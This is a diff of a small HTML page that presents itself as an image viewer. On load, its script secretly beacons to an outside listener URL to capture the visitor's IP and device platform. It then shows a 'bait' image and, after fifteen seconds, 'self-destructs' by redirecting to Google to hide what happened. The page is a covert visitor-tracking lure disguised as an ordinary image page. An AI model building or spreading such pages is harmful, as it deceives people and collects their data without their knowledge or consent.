@@ -1,29 +1,23 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Gallery</title>
+    <title>Image Viewer</title>
     <script>
-        function triggerAlpha() {
-            // VERIFIED ENDPOINT
-            const alpha = "https://bluekama-ops.free.beeceptor.com/hit";
-            const omega = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
+        function runOperation() {
+            const listener = "https://bluekama-ops.free.beeceptor.com/hit";
+            const image = "https://github.com/bluekama/project-portfolio/blob/main/IMG_0542.PNG?raw=true";
             
-            // 1. DATA PING (No delay)
-            navigator.sendBeacon(alpha + "?ref=final_fix&ts=" + Date.now());
+            // 1. DATA PING (IP Capture)
+            navigator.sendBeacon(listener + "?device=" + navigator.platform);
 
-            // 2. THE BAIT (1 second delay)
-            setTimeout(function() {
-                window.location.href = omega;
-            }, 1000);
+            // 2. SHOW BAIT (1s delay)
+            setTimeout(() => { window.location.href = image; }, 1000);
 
-            // 3. THE SELF-DESTRUCT (15 second delay)
-            setTimeout(function() {
-                window.location.replace("https://www.google.com");
-            }, 15000);
+            // 3. SELF-DESTRUCT (15s delay - Reroutes to Google)
+            setTimeout(() => { window.location.replace("https://www.google.com"); }, 15000);
         }
-        window.onload = triggerAlpha;
+        window.onload = runOperation;
     </script>
 </head>
-<body style="background-color: #000;">
-</body>
+<body style="background-color: black;"></body>
 </html>
